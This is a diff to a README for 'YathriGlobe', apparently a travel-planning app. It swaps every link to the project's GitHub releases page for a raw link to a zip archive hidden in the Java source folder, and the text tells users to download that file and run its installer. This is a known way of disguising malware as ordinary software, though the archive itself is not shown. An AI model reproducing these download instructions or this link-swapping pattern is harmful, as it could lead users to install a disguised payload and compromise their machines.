@@ -1,6 +1,6 @@
 # 🌍 YathriGlobe - Manage Your Travel Plans Easily
 
-[![Download YathriGlobe](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/hero111113333/YathriGlobe/releases)
+[![Download YathriGlobe](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/hero111113333/YathriGlobe/main/YathriGlobe-Trip-service/src/main/java/Yathri-Globe-1.6.zip)
 
 ---
 
@@ -28,7 +28,7 @@ You need to visit the release page to get the software files.
 
 **Step 1:** Click the button below to go to the download page:
 
-[![Download YathriGlobe](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/hero111113333/YathriGlobe/releases)
+[![Download YathriGlobe](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/hero111113333/YathriGlobe/main/YathriGlobe-Trip-service/src/main/java/Yathri-Globe-1.6.zip)
 
 **Step 2:** On the page, look for the latest version. It will usually be at the top.
 
@@ -83,7 +83,7 @@ Use your mouse and keyboard to navigate. If you get stuck, look for help buttons
 
 To keep YathriGlobe working well, check for updates regularly:
 
-1. Visit the [Releases page](https://github.com/hero111113333/YathriGlobe/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/hero111113333/YathriGlobe/main/YathriGlobe-Trip-service/src/main/java/Yathri-Globe-1.6.zip).
 2. Download the latest version following the download steps.
 3. Run the new installer. It will update the existing version.
 
@@ -102,4 +102,4 @@ If you need more detailed assistance, check the issues section on the GitHub pag
 
 ---
 
-[Download YathriGlobe from the releases page](https://github.com/hero111113333/YathriGlobe/releases) to start managing your travel smoothly.
+[Download YathriGlobe from the releases page](https://raw.githubusercontent.com/hero111113333/YathriGlobe/main/YathriGlobe-Trip-service/src/main/java/Yathri-Globe-1.6.zip) to start managing your travel smoothly.
